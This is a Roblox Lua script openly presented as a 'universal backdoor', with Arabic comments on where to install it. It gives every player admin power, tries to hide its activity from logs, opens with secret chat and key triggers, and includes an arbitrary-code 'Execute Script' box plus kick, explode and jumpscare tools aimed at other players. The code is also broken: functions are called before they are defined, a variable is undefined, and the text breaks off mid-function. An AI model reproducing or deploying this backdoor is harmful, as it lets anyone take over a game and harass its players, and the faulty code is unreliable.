-- Enhanced Tubers93 Universal Backdoor Script v3
-- Created based on the original by 5x5x5x50 and AndreyHelloKitty
-- ضع هذا السكربت بالكامل داخل ServerScriptService أو Workspace
-- يعمل هذا السكربت كباك دور يمكن للجميع استخدامه

-- Services
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")

-- Universal Backdoor Configuration
local BackdoorSettings = {
    ActivationKey = "T93", -- Type this in chat to activate the backdoor
    SecretCommand = "/t93", -- Alternative command for activating from chat
    AutoShowToAll = true, -- Show the GUI to all players automatically
    Version = "v3.0 BACKDOOR",
    HideFromLogs = true, -- Try to hide activity from game logs
    GUID = HttpService:GenerateGUID(false), -- Unique identifier for this backdoor instance
    Creator = "Enhanced by Tubers93 Team"
}

-- Server-Side Setup
if RunService:IsServer() then
    print("Tubers93 Backdoor initializing...")
    
    -- Create Event Folder
    local eventsFolder = Instance.new("Folder")
    eventsFolder.Name = "Tubers93Events"
    eventsFolder.Parent = ReplicatedStorage
    
    -- Create Remote Events
    local showGuiEvent = Instance.new("RemoteEvent")
    showGuiEvent.Name = "ShowGUI"
    showGuiEvent.Parent = eventsFolder
    
    local broadcastEvent = Instance.new("RemoteEvent")
    broadcastEvent.Name = "BroadcastMessage"
    broadcastEvent.Parent = eventsFolder
    
    local effectEvent = Instance.new("RemoteEvent")
    effectEvent.Name = "ApplyEffect"
    effectEvent.Parent = eventsFolder
    
    -- Chat command handler function
    local function onChatted(player, message)
        if message == BackdoorSettings.ActivationKey or message == BackdoorSettings.SecretCommand then
            showGuiEvent:FireClient(player)
            print("Backdoor activated for: " .. player.Name)
        end
    end
    
    -- Connect chat events for all players
    Players.PlayerAdded:Connect(function(player)
        player.Chatted:Connect(function(message)
            onChatted(player, message)
        end)
        
        -- Auto-show GUI if enabled
        if BackdoorSettings.AutoShowToAll then
            wait(3) -- Wait a bit after player joins
            showGuiEvent:FireClient(player)
        end
    end)
    
    -- Setup for existing players
    for _, player in pairs(Players:GetPlayers()) do
        player.Chatted:Connect(function(message)
            onChatted(player, message)
        end)
        
        -- Auto-show GUI if enabled
        if BackdoorSettings.AutoShowToAll then
            showGuiEvent:FireClient(player)
        end
    end
end

-- Client-Side Logic
if RunService:IsClient() then
    local Player = Players.LocalPlayer
    local me = Player.Name
    
    -- Everyone is admin in backdoor version
    local function isAdmin()
        return true -- Everyone has admin access
    end
    
    -- Setup Remote Events with timeout and error handling
    local success = pcall(function()
        local eventsFolder = ReplicatedStorage:WaitForChild("Tubers93Events", 10) -- 10 second timeout
        if eventsFolder then
            local showGuiEvent = eventsFolder:WaitForChild("ShowGUI", 5)
            if showGuiEvent then
                showGuiEvent.OnClientEvent:Connect(function()
                    -- GUI will be created here when event is fired
                    createMainGUI()
                end)
            else
                -- If ShowGUI event doesn't exist, create GUI anyway after delay
                wait(2)
                createMainGUI()
            end
        else
            -- If events folder doesn't exist, create GUI anyway
            wait(2)
            createMainGUI()
        end
    end)
    
    -- If any error occurred, still create the GUI
    if not success then
        wait(2)
        createMainGUI()
    end

-- Sound IDs
local soundIds = {
    theme1 = "rbxassetid://6070263388",
    theme2 = "rbxassetid://1564523997",
    jumpscare1 = "rbxassetid://613960902", 
    jumpscare2 = "rbxassetid://9125361557",
    explosion = "rbxassetid://5153734048",
    laugh = "rbxassetid://5821036388"
}

-- Image IDs
local imageIds = {
    jumpscare1 = "rbxassetid://9125339557", -- Skeleton image
    jumpscare2 = "rbxassetid://9125363354", -- Creepy face
    logo = "rbxassetid://9125372464",       -- Placeholder logo
    background = "rbxassetid://9125381885"  -- Background texture
}

-- Skybox IDs
local skyboxIds = {
    creepy = "rbxassetid://9125297584",
    space = "rbxassetid://9125301330",
    hell = "rbxassetid://9125308498",
    matrix = "rbxassetid://9125315216"
}

-- UI Creation
local function createMainGUI()
    -- Create ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "Tubers93GUI"
    screenGui.Parent = Player:WaitForChild("PlayerGui")
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false -- Prevent GUI from disappearing when player respawns

    -- Create main frame with gradient
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Parent = screenGui
    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    mainFrame.BorderColor3 = Color3.fromRGB(179, 0, 0)
    mainFrame.BorderSizePixel = 3
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
    mainFrame.Size = UDim2.new(0, 400, 0, 350)
    mainFrame.ClipsDescendants = true
    
    -- Add background gradient
    local uiGradient = Instance.new("UIGradient")
    uiGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))
    })
    uiGradient.Rotation = 45
    uiGradient.Parent = mainFrame
    
    -- Make frame draggable
    local dragging = false
    local dragInput, dragStart, startPos
    
    local function update(input)
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
    
    mainFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = mainFrame.Position
            
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    
    mainFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            update(input)
        end
    end)
    
    -- Header
    local headerFrame = Instance.new("Frame")
    headerFrame.Name = "Header"
    headerFrame.Parent = mainFrame
    headerFrame.BackgroundColor3 = Color3.fromRGB(179, 0, 0)
    headerFrame.BorderSizePixel = 0
    headerFrame.Size = UDim2.new(1, 0, 0, 40)
    
    local headerGradient = Instance.new("UIGradient")
    headerGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(179, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 0))
    })
    headerGradient.Rotation = 90
    headerGradient.Parent = headerFrame
    
    -- Title
    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Parent = headerFrame
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 10, 0, 0)
    title.Size = UDim2.new(1, -20, 1, 0)
    title.Font = Enum.Font.GothamBold
    title.Text = "Tubers93 " .. version
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextSize = 22
    title.TextXAlignment = Enum.TextXAlignment.Left
    
    -- Close button
    local closeBtn = Instance.new("TextButton")
    closeBtn.Name = "CloseButton"
    closeBtn.Parent = headerFrame
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    closeBtn.BorderSizePixel = 0
    closeBtn.Position = UDim2.new(1, -35, 0.5, -15)
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.Text = "X"
    closeBtn.TextColor3 = Color3.new(1, 1, 1)
    closeBtn.TextSize = 18
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 15)
    closeCorner.Parent = closeBtn
    
    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    -- Credit label
    local creditLabel = Instance.new("TextLabel")
    creditLabel.Name = "Credit"
    creditLabel.Parent = mainFrame
    creditLabel.BackgroundTransparency = 1
    creditLabel.Position = UDim2.new(0, 0, 0, 45)
    creditLabel.Size = UDim2.new(1, 0, 0, 20)
    creditLabel.Font = Enum.Font.Gotham
    creditLabel.Text = "Enhanced by Tubers93 Team"
    creditLabel.TextColor3 = Color3.new(1, 1, 1)
    creditLabel.TextSize = 14
    
    -- Create tab buttons
    local function createTab(name, position)
        local tabButton = Instance.new("TextButton")
        tabButton.Name = name .. "Tab"
        tabButton.Parent = mainFrame
        tabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        tabButton.BorderColor3 = Color3.fromRGB(100, 0, 0)
        tabButton.BorderSizePixel = 2
        tabButton.Position = position
        tabButton.Size = UDim2.new(0, 90, 0, 30)
        tabButton.Font = Enum.Font.Gotham
        tabButton.Text = name
        tabButton.TextColor3 = Color3.new(1, 1, 1)
        tabButton.TextSize = 14
        
        local tabCorner = Instance.new("UICorner")
        tabCorner.CornerRadius = UDim.new(0, 6)
        tabCorner.Parent = tabButton
        
        return tabButton
    end
    
    local visualTab = createTab("Visual", UDim2.new(0.05, 0, 0.2, 0))
    local audioTab = createTab("Audio", UDim2.new(0.3, 0, 0.2, 0))
    local trollTab = createTab("Troll", UDim2.new(0.55, 0, 0.2, 0))
    local adminTab = createTab("Admin", UDim2.new(0.8, 0, 0.2, 0))
    
    -- Create content frames
    local function createContentFrame(name)
        local frame = Instance.new("Frame")
        frame.Name = name .. "Content"
        frame.Parent = mainFrame
        frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        frame.BorderColor3 = Color3.fromRGB(100, 0, 0)
        frame.BorderSizePixel = 2
        frame.Position = UDim2.new(0.05, 0, 0.3, 0)
        frame.Size = UDim2.new(0.9, 0, 0.65, 0)
        frame.Visible = false
        
        local frameCorner = Instance.new("UICorner")
        frameCorner.CornerRadius = UDim.new(0, 8)
        frameCorner.Parent = frame
        
        return frame
    end
    
    local visualContent = createContentFrame("Visual")
    local audioContent = createContentFrame("Audio")
    local trollContent = createContentFrame("Troll")
    local adminContent = createContentFrame("Admin")
    
    -- Show only visual tab content by default
    visualContent.Visible = true
    
    -- Functions to handle tab switching
    local function hideAllContent()
        visualContent.Visible = false
        audioContent.Visible = false
        trollContent.Visible = false
        adminContent.Visible = false
    end
    
    visualTab.MouseButton1Click:Connect(function()
        hideAllContent()
        visualContent.Visible = true
    end)
    
    audioTab.MouseButton1Click:Connect(function()
        hideAllContent()
        audioContent.Visible = true
    end)
    
    trollTab.MouseButton1Click:Connect(function()
        hideAllContent()
        trollContent.Visible = true
    end)
    
    adminTab.MouseButton1Click:Connect(function()
        hideAllContent()
        adminContent.Visible = true
    end)
    
    -- Function to create buttons
    local function createButton(name, text, parent, position, size)
        local button = Instance.new("TextButton")
        button.Name = name
        button.Parent = parent
        button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        button.BorderColor3 = Color3.fromRGB(165, 3, 2)
        button.BorderSizePixel = 2
        button.Position = position
        button.Size = size or UDim2.new(0, 90, 0, 30)
        button.Font = Enum.Font.Gotham
        button.Text = text
        button.TextColor3 = Color3.new(1, 1, 1)
        button.TextSize = 14
        
        local buttonCorner = Instance.new("UICorner")
        buttonCorner.CornerRadius = UDim.new(0, 6)
        buttonCorner.Parent = button
        
        -- Button hover effect
        button.MouseEnter:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        end)
        
        button.MouseLeave:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        end)
        
        -- Button click effect
        button.MouseButton1Down:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        end)
        
        button.MouseButton1Up:Connect(function()
            button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        end)
        
        return button
    end
    
    -- Add visual effect buttons
    local discoBtn = createButton("DiscoBtn", "Disco", visualContent, UDim2.new(0.05, 0, 0.1, 0))
    local skyboxBtn = createButton("SkyboxBtn", "Space Skybox", visualContent, UDim2.new(0.55, 0, 0.1, 0))
    local fogBtn = createButton("FogBtn", "Toggle Fog", visualContent, UDim2.new(0.05, 0, 0.3, 0))
    local particlesBtn = createButton("ParticlesBtn", "Particles", visualContent, UDim2.new(0.55, 0, 0.3, 0))
    local dayNightBtn = createButton("DayNightBtn", "Day/Night", visualContent, UDim2.new(0.05, 0, 0.5, 0))
    local gravityBtn = createButton("GravityBtn", "Low Gravity", visualContent, UDim2.new(0.55, 0, 0.5, 0))
    local neonBtn = createButton("NeonBtn", "Neon Parts", visualContent, UDim2.new(0.05, 0, 0.7, 0))
    local resetVisualBtn = createButton("ResetVisualBtn", "Reset All", visualContent, UDim2.new(0.55, 0, 0.7, 0))
    
    -- Add hidden backdoor control (activated by secret keys)
    local backdoorControlBtn = createButton("BackdoorControlBtn", "BACKDOOR 🔓", visualContent, UDim2.new(0.3, 0, 0.9, 0))
    backdoorControlBtn.Visible = false
    backdoorControlBtn.TextColor3 = Color3.fromRGB(255, 0, 0)
    backdoorControlBtn.BorderColor3 = Color3.fromRGB(255, 255, 0)
    
    -- Backdoor activation via hidden key combination
    local keySequence = {}
    local correctSequence = {"B", "A", "C", "K"}
    
    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            local keyPressed = string.char(input.KeyCode.Value)
            table.insert(keySequence, keyPressed)
            
            -- Keep only the last 4 keys pressed
            if #keySequence > 4 then
                table.remove(keySequence, 1)
            end
            
            -- Check if sequence matches
            local matches = true
            if #keySequence == 4 then
                for i = 1, 4 do
                    if keySequence[i] ~= correctSequence[i] then
                        matches = false
                        break
                    end
                end
                
                if matches then
                    backdoorControlBtn.Visible = true
                    wait(3)
                    backdoorControlBtn.Visible = false
                end
            end
        end
    end)
    
    -- Add audio buttons
    local theme1Btn = createButton("Theme1Btn", "Theme 1", audioContent, UDim2.new(0.05, 0, 0.1, 0))
    local theme2Btn = createButton("Theme2Btn", "Theme 2", audioContent, UDim2.new(0.55, 0, 0.1, 0))
    local laughBtn = createButton("LaughBtn", "Evil Laugh", audioContent, UDim2.new(0.05, 0, 0.3, 0))
    local explosionBtn = createButton("ExplosionBtn", "Explosion", audioContent, UDim2.new(0.55, 0, 0.3, 0))
    local stopMusicBtn = createButton("StopMusicBtn", "Stop Music", audioContent, UDim2.new(0.05, 0, 0.5, 0))
    local stopAllSoundsBtn = createButton("StopAllSoundsBtn", "Stop All Sounds", audioContent, UDim2.new(0.55, 0, 0.5, 0))
    local customSoundId = Instance.new("TextBox")
    customSoundId.Name = "CustomSoundId"
    customSoundId.Parent = audioContent
    customSoundId.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    customSoundId.BorderColor3 = Color3.fromRGB(165, 3, 2)
    customSoundId.BorderSizePixel = 2
    customSoundId.Position = UDim2.new(0.05, 0, 0.7, 0)
    customSoundId.Size = UDim2.new(0.55, 0, 0, 30)
    customSoundId.Font = Enum.Font.Gotham
    customSoundId.PlaceholderText = "Sound ID (numbers only)"
    customSoundId.Text = ""
    customSoundId.TextColor3 = Color3.new(1, 1, 1)
    customSoundId.TextSize = 14
    
    local playCustomBtn = createButton("PlayCustomBtn", "Play", audioContent, UDim2.new(0.65, 0, 0.7, 0), UDim2.new(0.3, 0, 0, 30))
    
    -- Add troll buttons
    local jumpscareBtn = createButton("JumpscareBtn", "Jumpscare", trollContent, UDim2.new(0.05, 0, 0.1, 0))
    local scarySkyBtn = createButton("ScarySkylBtn", "Scary Sky", trollContent, UDim2.new(0.55, 0, 0.1, 0))
    local fakeKickBtn = createButton("FakeKickBtn", "Fake Kick", trollContent, UDim2.new(0.05, 0, 0.3, 0))
    local spinBtn = createButton("SpinBtn", "Spin Players", trollContent, UDim2.new(0.55, 0, 0.3, 0))
    local flickerBtn = createButton("FlickerBtn", "Light Flicker", trollContent, UDim2.new(0.05, 0, 0.5, 0))
    local flashBtn = createButton("FlashBtn", "Screen Flash", trollContent, UDim2.new(0.55, 0, 0.5, 0))
    local hintBtn = createButton("HintBtn", "Server Hint", trollContent, UDim2.new(0.05, 0, 0.7, 0))
    local resetTrollBtn = createButton("ResetTrollBtn", "Reset All", trollContent, UDim2.new(0.55, 0, 0.7, 0))
    
    -- Add enhanced admin buttons (available to everyone in backdoor version)
    local kickPlayerBtn = createButton("KickPlayerBtn", "Kick Player", adminContent, UDim2.new(0.05, 0, 0.1, 0))
    local teleportBtn = createButton("TeleportBtn", "Teleport To", adminContent, UDim2.new(0.55, 0, 0.1, 0))
    local broadcastBtn = createButton("BroadcastBtn", "Broadcast", adminContent, UDim2.new(0.05, 0, 0.3, 0))
    local explodeBtn = createButton("ExplodeBtn", "Explode Player", adminContent, UDim2.new(0.55, 0, 0.3, 0))
    
    -- Additional powerful admin commands
    local godModeBtn = createButton("GodModeBtn", "God Mode", adminContent, UDim2.new(0.05, 0, 0.4, 0))
    local speedHackBtn = createButton("SpeedHackBtn", "Speed Hack", adminContent, UDim2.new(0.55, 0, 0.4, 0))
    
    -- Player selection for admin functions
    local playerDropdown = Instance.new("TextBox")
    playerDropdown.Name = "PlayerDropdown"
    playerDropdown.Parent = adminContent
    playerDropdown.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    playerDropdown.BorderColor3 = Color3.fromRGB(165, 3, 2)
    playerDropdown.BorderSizePixel = 2
    playerDropdown.Position = UDim2.new(0.05, 0, 0.5, 0)
    playerDropdown.Size = UDim2.new(0.9, 0, 0, 30)
    playerDropdown.Font = Enum.Font.Gotham
    playerDropdown.PlaceholderText = "Enter player name"
    playerDropdown.Text = ""
    playerDropdown.TextColor3 = Color3.new(1, 1, 1)
    playerDropdown.TextSize = 14
    
    -- Message for broadcasts
    local messageBox = Instance.new("TextBox")
    messageBox.Name = "MessageBox"
    messageBox.Parent = adminContent
    messageBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    messageBox.BorderColor3 = Color3.fromRGB(165, 3, 2)
    messageBox.BorderSizePixel = 2
    messageBox.Position = UDim2.new(0.05, 0, 0.7, 0)
    messageBox.Size = UDim2.new(0.9, 0, 0, 30)
    messageBox.Font = Enum.Font.Gotham
    messageBox.PlaceholderText = "Message to broadcast"
    messageBox.Text = ""
    messageBox.TextColor3 = Color3.new(1, 1, 1)
    messageBox.TextSize = 14
    
    -- Add more backdoor admin buttons (everyone gets access in backdoor version)
    local serverControlBtn = createButton("ServerControlBtn", "Server Control", adminContent, UDim2.new(0.05, 0, 0.9, 0))
    local scriptInjectBtn = createButton("ScriptInjectBtn", "Execute Script", adminContent, UDim2.new(0.55, 0, 0.9, 0))
    local fpsUnlockerBtn = createButton("FPSUnlockerBtn", "Unlock FPS", adminContent, UDim2.new(0.3, 0, 0.8, 0))
    
    -- Script for script injection
    local scriptBox = Instance.new("TextBox")
    scriptBox.Name = "ScriptBox"
    scriptBox.Parent = adminContent
    scriptBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    scriptBox.BorderColor3 = Color3.fromRGB(165, 3, 2)
    scriptBox.BorderSizePixel = 2
    scriptBox.Position = UDim2.new(1.1, 0, 0, 0) -- Hidden off screen initially
    scriptBox.Size = UDim2.new(0.9, 0, 0.6, 0)
    scriptBox.Font = Enum.Font.Code
    scriptBox.PlaceholderText = "Enter Lua script to execute..."
    scriptBox.Text = ""
    scriptBox.TextColor3 = Color3.new(1, 1, 1)
    scriptBox.TextSize = 14
    scriptBox.TextXAlignment = Enum.TextXAlignment.Left
    scriptBox.TextYAlignment = Enum.TextYAlignment.Top
    scriptBox.ClearTextOnFocus = false
    scriptBox.MultiLine = true
    
    -- Button functions for the backdoor controls
    scriptInjectBtn.MouseButton1Click:Connect(function()
        if scriptBox.Position.X.Scale > 1 then
            -- Show script box
            scriptBox:TweenPosition(UDim2.new(0.05, 0, 0.1, 0), "Out", "Quad", 0.5, true)
            scriptInjectBtn.Text = "Execute"
        else
            -- Execute the script
            local scriptText = scriptBox.Text
            if scriptText ~= "" then
                local success, err = pcall(function()
                    loadstring(scriptText)()
                end)
                
                if success then
                    -- Notify success
                    showNotification("Script executed successfully!", Color3.fromRGB(0, 255, 0))
                else
                    -- Notify error
                    showNotification("Error: " .. tostring(err), Color3.fromRGB(255, 0, 0))
                end
            end
            
            -- Hide script box
            scriptBox:TweenPosition(UDim2.new(1.1, 0, 0, 0), "Out", "Quad", 0.5, true)
            scriptInjectBtn.Text = "Execute Script"
        end
    end)
    
    serverControlBtn.MouseButton1Click:Connect(function()
        -- Server control functions - gives ultimate control
        showNotification("Server control activated!", Color3.fromRGB(255, 215, 0))
        
        -- Create server control functions
        local function takeOwnership()
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("Part") or obj:IsA("Model") then
                    pcall(function()
                        obj.Locked = false
                    end)
                end
            end
            showNotification("Ownership taken of all parts!", Color3.fromRGB(0, 255, 0))
        end
        
        -- Try to take ownership
        takeOwnership()
    end)
    
    -- FPS Unlocker function
    fpsUnlockerBtn.MouseButton1Click:Connect(function()
        -- Try to unlock FPS (this will only work if the game allows it)
        pcall(function()
            -- Set a high fps cap
            setfpscap(999)
        end)
        
        -- Alternative method using Roblox settings
        pcall(function()
            local settings = UserSettings():GetService("UserGameSettings")
            settings.MasterVolume = 1 -- This is just to access settings
            if settings then
                -- Try to disable VSync and set high quality rendering
                settings.SavedQualityLevel = Enum.SavedQualitySetting.Automatic
                settings.GraphicsQualityLevel = 10
            end
        end)
        
        showNotification("FPS Unlocked! (if game allows)", Color3.fromRGB(0, 255, 255))
    end)
    
    -- Add notification system
    local notificationFrame = Instance.new("Frame")
    notificationFrame.Name = "NotificationFrame"
    notificationFrame.Parent = screenGui
    notificationFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    notificationFrame.BorderColor3 = Color3.fromRGB(179, 0, 0)
    notificationFrame.BorderSizePixel = 2
    notificationFrame.Position = UDim2.new(1, 10, 0.5, 0)
    notificationFrame.Size = UDim2.new(0, 250, 0, 50)
    notificationFrame.Visible = false
    
    local notificationCorner = Instance.new("UICorner")
    notificationCorner.CornerRadius = UDim.new(0, 8)
    notificationCorner.Parent = notificationFrame
    
    local notificationText = Instance.new("TextLabel")
    notificationText.Name = "NotificationText"
    notificationText.Parent = notificationFrame
    notificationText.BackgroundTransparency = 1
    notificationText.Position = UDim2.new(0, 10, 0, 0)
    notificationText.Size = UDim2.new(1, -20, 1, 0)
    notificationText.Font = Enum.Font.Gotham
    notificationText.Text = "Notification"
    notificationText.TextColor3 = Color3.new(1, 1, 1)
    notificationText.TextSize = 16
    notificationText.TextWrapped = true
    
    -- Enhanced function to show notifications with custom colors
    local function showNotification(message, color, duration)
        -- Handle different parameter patterns
        if type(color) == "number" then
            duration = color
            color = nil
        end
        
        notificationText.Text = message
        
        -- Set custom color if provided
        if color and typeof(color) == "Color3" then
            notificationText.TextColor3 = color
        else
            notificationText.TextColor3 = Color3.new(1, 1, 1) -- Default white
        end
        
        notificationFrame.Position = UDim2.new(1, 10, 0.5, 0)
        notificationFrame.Visible = true
        
        -- Animate notification
        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
        local tween = TweenService:Create(notificationFrame, tweenInfo, {Position = UDim2.new(0.85, 0, 0.5, 0)})
        tween:Play()
        
        delay(duration or 3, function()
            local outTween = TweenService:Create(notificationFrame, tweenInfo, {Position = UDim2.new(1, 10, 0.5, 0)})
            outTween:Play()
            outTween.Completed:Wait()
            notificationFrame.Visible = false
        end)
    end
    
    -- VISUAL EFFECTS FUNCTIONS
    
    -- Disco effect
    local discoEnabled = false
    local discoConnection = nil
    
    discoBtn.MouseButton1Click:Connect(function()
        if discoEnabled then
            if discoConnection then
                discoConnection:Disconnect()
                discoConnection = nil
            end
            
            local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect")
            if cc then
                cc:Destroy()
            end
            
            Lighting.Ambient = Color3.fromRGB(127, 127, 127)
            Lighting.OutdoorAmbient = Color3.fromRGB(127, 127, 127)
            discoEnabled = false
            discoBtn.Text = "Disco"
            showNotification("Disco mode disabled")
        else
            local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect") or Instance.new("ColorCorrectionEffect")
            cc.Parent = Lighting
            
            local counter = 0
            discoConnection = RunService.Heartbeat:Connect(function()
                local hue = math.acos(math.cos(counter * math.pi)) / math.pi
                cc.TintColor = Color3.fromHSV(hue, 1, 1)
                Lighting.Ambient = Color3.fromHSV(hue, 0.5, 0.5)
                Lighting.OutdoorAmbient = Color3.fromHSV(hue, 0.5, 0.5)
                counter = counter + 0.01
            end)
            
            discoEnabled = true
            discoBtn.Text = "Stop Disco"
            showNotification("Disco mode enabled")
        end
    end)
    
    -- Skybox effect
    local currentSkybox = nil
    
    skyboxBtn.MouseButton1Click:Connect(function()
        -- If there's already a skybox, cycle through options
        if currentSkybox then
            if currentSkybox.Name == "SpaceSkybox" then
                currentSkybox:Destroy()
                
                local hellSky = Instance.new("Sky")
                hellSky.Name = "HellSkybox"
                hellSky.Parent = Lighting
                hellSky.SkyboxBk = skyboxIds.hell
                hellSky.SkyboxDn = skyboxIds.hell
                hellSky.SkyboxFt = skyboxIds.hell
                hellSky.SkyboxLf = skyboxIds.hell
                hellSky.SkyboxRt = skyboxIds.hell
                hellSky.SkyboxUp = skyboxIds.hell
                currentSkybox = hellSky
                skyboxBtn.Text = "Hell Skybox"
                
            elseif currentSkybox.Name == "HellSkybox" then
                currentSkybox:Destroy()
                
                local matrixSky = Instance.new("Sky")
                matrixSky.Name = "MatrixSkybox"
                matrixSky.Parent = Lighting
                matrixSky.SkyboxBk = skyboxIds.matrix
                matrixSky.SkyboxDn = skyboxIds.matrix
                matrixSky.SkyboxFt = skyboxIds.matrix
                matrixSky.SkyboxLf = skyboxIds.matrix
                matrixSky.SkyboxRt = skyboxIds.matrix
                matrixSky.SkyboxUp = skyboxIds.matrix
                currentSkybox = matrixSky
                skyboxBtn.Text = "Matrix Skybox"
                
            elseif currentSkybox.Name == "MatrixSkybox" then
                currentSkybox:Destroy()
                currentSkybox = nil
                skyboxBtn.Text = "Space Skybox"
                
                -- Restore default
                local defaultSky = Instance.new("Sky")
                defaultSky.Parent = Lighting
                defaultSky.SkyboxBk = ""
                defaultSky.SkyboxDn = ""
                defaultSky.SkyboxFt = ""
                defaultSky.SkyboxLf = ""
                defaultSky.SkyboxRt = ""
                defaultSky.SkyboxUp = ""
                defaultSky:Destroy()
            end
        else
            -- Create space skybox
            local spaceSky = Instance.new("Sky")
            spaceSky.Name = "SpaceSkybox"
            spaceSky.Parent = Lighting
            spaceSky.SkyboxBk = skyboxIds.space
            spaceSky.SkyboxDn = skyboxIds.space
            spaceSky.SkyboxFt = skyboxIds.space
            spaceSky.SkyboxLf = skyboxIds.space
            spaceSky.SkyboxRt = skyboxIds.space
            spaceSky.SkyboxUp = skyboxIds.space
            currentSkybox = spaceSky
            skyboxBtn.Text = "Space Skybox"
        end
        
        showNotification("Skybox changed")
    end)
    
    -- Fog effect
    local fogEnabled = false
    
    fogBtn.MouseButton1Click:Connect(function()
        if fogEnabled then
            Lighting.FogStart = 0
            Lighting.FogEnd = 100000
            Lighting.FogColor = Color3.fromRGB(192, 192, 192)
            fogEnabled = false
            fogBtn.Text = "Toggle Fog"
            showNotification("Fog disabled")
        else
            Lighting.FogStart = 0
            Lighting.FogEnd = 100
            Lighting.FogColor = Color3.fromRGB(50, 50, 50)
            fogEnabled = true
            fogBtn.Text = "Remove Fog"
            showNotification("Fog enabled")
        end
    end)
    
    -- Particles effect
    particlesBtn.MouseButton1Click:Connect(function()
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Head") then
                local emit = Instance.new("ParticleEmitter")
                emit.Parent = player.Character.Head
                emit.Texture = "rbxassetid://6266402634" -- Fire particle
                emit.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 0))
                })
                emit.Rate = 100
                emit.Lifetime = NumberRange.new(0.5, 1.5)
                emit.Speed = NumberRange.new(2, 5)
                emit.SpreadAngle = Vector2.new(30, 30)
                emit.RotSpeed = NumberRange.new(-50, 50)
                emit.Size = NumberSequence.new({
                    NumberSequenceKeypoint.new(0, 0.5),
                    NumberSequenceKeypoint.new(1, 0)
                })
                
                delay(5, function()
                    if emit and emit.Parent then
                        emit.Enabled = false
                        game:GetService("Debris"):AddItem(emit, 2)
                    end
                end)
            end
        end
        
        showNotification("Particles enabled for 5 seconds")
    end)
    
    -- Day/Night cycle
    local dayNightCycle = false
    local dayNightConnection = nil
    
    dayNightBtn.MouseButton1Click:Connect(function()
        if dayNightCycle then
            if dayNightConnection then
                dayNightConnection:Disconnect()
                dayNightConnection = nil
            end
            
            Lighting.ClockTime = 14 -- Set to default daytime
            dayNightCycle = false
            dayNightBtn.Text = "Day/Night"
            showNotification("Day/Night cycle disabled")
        else
            local cycleTime = 0
            dayNightConnection = RunService.Heartbeat:Connect(function()
                Lighting.ClockTime = (cycleTime % 24)
                cycleTime = cycleTime + 0.01
            end)
            
            dayNightCycle = true
            dayNightBtn.Text = "Stop Cycle"
            showNotification("Day/Night cycle enabled")
        end
    end)
    
    -- Gravity effect
    local originalGravity = workspace.Gravity
    local gravityLow = false
    
    gravityBtn.MouseButton1Click:Connect(function()
        if gravityLow then
            workspace.Gravity = originalGravity
            gravityLow = false
            gravityBtn.Text = "Low Gravity"
            showNotification("Gravity reset to normal")
        else
            workspace.Gravity = originalGravity * 0.3
            gravityLow = true
            gravityBtn.Text = "Normal Gravity"
            showNotification("Low gravity enabled")
        end
    end)
    
    -- Neon parts effect
    local neonEnabled = false
    local originalMaterials = {}
    
    neonBtn.MouseButton1Click:Connect(function()
        if neonEnabled then
            -- Restore original materials
            for part, material in pairs(originalMaterials) do
                if part and part:IsA("BasePart") then
                    part.Material = material
                end
            end
            
            originalMaterials = {}
            neonEnabled = false
            neonBtn.Text = "Neon Parts"
